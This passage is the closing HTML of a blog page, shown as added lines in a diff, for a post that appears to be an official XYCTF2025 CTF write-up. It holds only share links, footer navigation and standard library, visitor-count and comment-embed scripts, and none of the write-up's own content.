+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/05/07/XYCTF2025-%E5%A5%B6%E9%BE%99%E5%9B%9E%E5%AE%B6%E5%AE%98%E6%96%B9WP/index/&is_video=false&description=XYCTF2025-奶龙回家官方WP"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=XYCTF2025-奶龙回家官方WP&body=Check out this article: http://example.com/2025/05/07/XYCTF2025-%E5%A5%B6%E9%BE%99%E5%9B%9E%E5%AE%B6%E5%AE%98%E6%96%B9WP/index/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/05/07/XYCTF2025-%E5%A5%B6%E9%BE%99%E5%9B%9E%E5%AE%B6%E5%AE%98%E6%96%B9WP/index/&title=XYCTF2025-奶龙回家官方WP"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/05/07/XYCTF2025-%E5%A5%B6%E9%BE%99%E5%9B%9E%E5%AE%B6%E5%AE%98%E6%96%B9WP/index/&title=XYCTF2025-奶龙回家官方WP"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/05/07/XYCTF2025-%E5%A5%B6%E9%BE%99%E5%9B%9E%E5%AE%B6%E5%AE%98%E6%96%B9WP/index/&title=XYCTF2025-奶龙回家官方WP"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/05/07/XYCTF2025-%E5%A5%B6%E9%BE%99%E5%9B%9E%E5%AE%B6%E5%AE%98%E6%96%B9WP/index/&title=XYCTF2025-奶龙回家官方WP"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/05/07/XYCTF2025-%E5%A5%B6%E9%BE%99%E5%9B%9E%E5%AE%B6%E5%AE%98%E6%96%B9WP/index/&name=XYCTF2025-奶龙回家官方WP&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/05/07/XYCTF2025-%E5%A5%B6%E9%BE%99%E5%9B%9E%E5%AE%B6%E5%AE%98%E6%96%B9WP/index/&t=XYCTF2025-奶龙回家官方WP"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+      <div class="footer-left">
+        Copyright &copy;
+        
+        
+        2016-2025
+        PuH4ck3rX
+      </div>
+      <div class="footer-right">
+        <nav>
+          <ul>
+            <!--
+          --><li><a href="/">h0m3</a></li><!--
+        --><!--
+          --><li><a href="/about/">ab0ut</a></li><!--
+        --><!--
+          --><li><a href="/archives/">art1cl3s</a></li><!--
+        --><!--
+          --><li><a href="/links/">l1nks</a></li><!--
+        --><!--
+          --><li><a href="/search/">s3arch</a></li><!--
+        -->
+          </ul>
+          <ul>
+            
+              <!-- busuanzi统计 -->
+              <span id="busuanzi_container_site_pv">
+                  本站总访问量<span id="busuanzi_value_site_pv"></span>次
+              </span>
+              <span class="post-meta-divider">|</span>
+              <span id="busuanzi_container_site_uv" style='display:none'>
+                      本站访客数<span id="busuanzi_value_site_uv"></span>人
+              </span>
+            <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            
+          </ul>
+        </nav>
+      </div>
+      
+</footer>
+
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'SITENAME';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+<!-- utterances Comments -->
+
+</body>
+</html>
